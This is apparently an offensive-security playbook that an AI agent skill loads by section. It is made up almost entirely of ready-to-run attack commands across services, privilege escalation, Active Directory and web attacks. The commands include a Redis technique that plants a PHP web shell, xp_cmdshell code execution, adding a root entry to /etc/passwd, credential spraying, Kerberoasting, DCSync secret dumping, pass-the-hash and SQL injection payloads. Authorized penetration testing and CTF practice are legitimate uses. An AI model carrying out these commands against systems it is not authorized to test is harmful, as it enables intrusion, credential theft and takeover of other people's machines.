# Pwn Playbook

Section headers below are stable — the skill greps for them by name to load
on-demand. Keep entries short and command-oriented. Prefer HackTricks /
GTFOBins / LOLBAS as canonical external references.

## Services

### SMB (445, 139)
- Enumerate: `enum4linux-ng -A <ip>`, `smbclient -L //<ip>/ -N`, `nxc smb <ip> -u '' -p ''`
- Shares: `smbclient //<ip>/<share> -N`, `smbmap -H <ip>`
- Null session / guest? Try anonymous on every share.
- Writable share → drop `.scf` / `.url` for NTLM hash capture (responder running).
- Known versions: EternalBlue (MS17-010) on SMBv1 — check `nmap --script smb-vuln-ms17-010`.
- See HackTricks: pentesting-smb.

### FTP (21)
- Anonymous? `ftp <ip>` user `anonymous` pass any.
- `nmap -sV -p21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor <ip>`.
- Writable? Combined with LFI/RFI or webroot upload, can become RCE.

### SSH (22)
- Version banner: `nc <ip> 22`. Check for known CVEs by version.
- Username enumeration on old OpenSSH (<= 7.7): CVE-2018-15473.
- Have creds? `ssh user@<ip>`. Try common passwords only if rules permit.
- Private key found? `chmod 600 key && ssh -i key user@<ip>`.

### HTTP / HTTPS (80, 443, 8080, 8443)
- Fingerprint: `whatweb <url>`, `curl -I <url>`, `wafw00f <url>`.
- Directory enum: `feroxbuster -u <url> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html`.
- Vhost enum: `ffuf -u http://<ip>/ -H "Host: FUZZ.<host>" -w <wordlist> -fs <baseline-size>`.
- Inspect: source, JS files, robots.txt, sitemap.xml, /.git/, /.env, /backup.
- Tech-specific: WordPress → `wpscan`; Drupal → `droopescan`; Joomla → `joomscan`.
- Common vuln classes: LFI, SSTI, SSRF, deserialization, auth bypass, IDOR.

### RDP (3389)
- `nmap --script rdp-enum-encryption,rdp-ntlm-info -p3389 <ip>`.
- BlueKeep (CVE-2019-0708) on unpatched Win7/2008.
- With creds: `xfreerdp /v:<ip> /u:user /p:pass +clipboard /dynamic-resolution`.

### WinRM (5985, 5986)
- With creds: `evil-winrm -i <ip> -u user -p pass`.
- Cred spray: `nxc winrm <ip> -u users.txt -p passwords.txt`.

### LDAP (389, 636)
- Anonymous bind: `ldapsearch -x -H ldap://<ip> -s base namingcontexts`.
- Dump: `ldapsearch -x -H ldap://<ip> -b "dc=domain,dc=local"`.
- With creds: `nxc ldap <ip> -u user -p pass --users --groups`.

### Kerberos (88)
- User enum: `kerbrute userenum -d domain.local --dc <ip> users.txt`.
- AS-REP roasting (no preauth): `impacket-GetNPUsers domain.local/ -dc-ip <ip> -usersfile users.txt`.
- Kerberoasting (creds needed): `impacket-GetUserSPNs domain.local/user:pass -dc-ip <ip> -request`.

### MSSQL (1433)
- `nxc mssql <ip> -u user -p pass`.
- xp_cmdshell for RCE when sysadmin: enable then `EXEC xp_cmdshell 'whoami'`.
- Impersonation: check with `SELECT * FROM sys.server_principals WHERE is_disabled = 0`.

### MySQL / MariaDB (3306)
- `mysql -h <ip> -u root -p`. Try `root` / empty.
- Read files: `SELECT LOAD_FILE('/etc/passwd')` if FILE priv.
- UDF privesc on writable plugin_dir.

### Redis (6379)
- `redis-cli -h <ip>`. Try `INFO`, `CONFIG GET *`.
- Webroot write: `CONFIG SET dir /var/www/html`, `CONFIG SET dbfilename shell.php`, `SET x "<?php system($_GET['c']); ?>"`, `SAVE`.
- SSH key write: same trick, dump pub key into `~/.ssh/authorized_keys`.

### SNMP (161/udp)
- `snmpwalk -v2c -c public <ip>`.
- Try community strings: public, private, manager.
- Windows: `1.3.6.1.4.1.77.1.2.25` for users, `1.3.6.1.2.1.25.4.2.1.2` for processes.

### NFS (2049)
- `showmount -e <ip>`.
- Mount: `mount -t nfs <ip>:/share /mnt/nfs`.
- no_root_squash + writable → drop SUID binary for privesc.

## Contexts

### Linux privilege escalation
- Run: `linpeas.sh`. Triage output by red/yellow flags.
- SUID: `find / -perm -4000 -type f 2>/dev/null`. Cross-reference GTFOBins.
- Sudo: `sudo -l`. Cross-reference GTFOBins (`sudo` column).
- Capabilities: `getcap -r / 2>/dev/null`. Check for cap_setuid, cap_dac_read_search.
- Cron: `cat /etc/crontab`, `ls -la /etc/cron.*`. Writable script or PATH abuse.
- Writable /etc/passwd? Add a root entry with known password.
- Kernel exploits (last resort): `uname -r`, check exploit-db.

### Windows privilege escalation
- Run: `winPEAS.exe` or `Seatbelt.exe -group=all`.
- `whoami /priv` — SeImpersonate / SeAssignPrimaryToken → JuicyPotato / PrintSpoofer / GodPotato.
- Unquoted service paths: `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"`.
- Weak service permissions: `accesschk.exe -uwcqv "Authenticated Users" *`.
- Stored creds: `cmdkey /list`, registry `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`.
- Always-install-elevated: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`.

### Active Directory attack paths
- Recon: `bloodhound-python -u user -p pass -d domain.local -ns <ip> -c all`.
- Kerberoast: `impacket-GetUserSPNs ... -request`, crack with hashcat `-m 13100`.
- AS-REP roast (DONT_REQ_PREAUTH): `impacket-GetNPUsers ... -no-pass`, crack with `-m 18200`.
- DCSync (with DA-equivalent rights or specific ACLs): `impacket-secretsdump -just-dc domain/user:pass@<dc>`.
- Pass-the-hash: `nxc smb <ip> -u user -H <nthash>`.
- Constrained / unconstrained delegation, ACL abuse, GenericAll / WriteDACL: BloodHound shows paths.

### Web vulnerability classes
- **LFI** → check `?file=`, `?page=`, `?include=`. Try `php://filter/convert.base64-encode/resource=index.php`. Log poisoning → RCE.
- **SSTI** → identify engine first (`{{7*7}}` vs `${7*7}` vs `<%= 7*7 %>`). PayloadsAllTheThings → SSTI section.
- **SSRF** → internal services, cloud metadata `169.254.169.254`, gopher://.
- **Deserialization** → ysoserial (Java), pickle (Python), node-serialize (Node).
- **SQLi** → `sqlmap -u <url> --batch --risk=2 --level=3`. Manual: `' OR 1=1--`, time-based for blind.
- **File upload** → bypass extension filters, content-type, magic bytes; race conditions on validators.
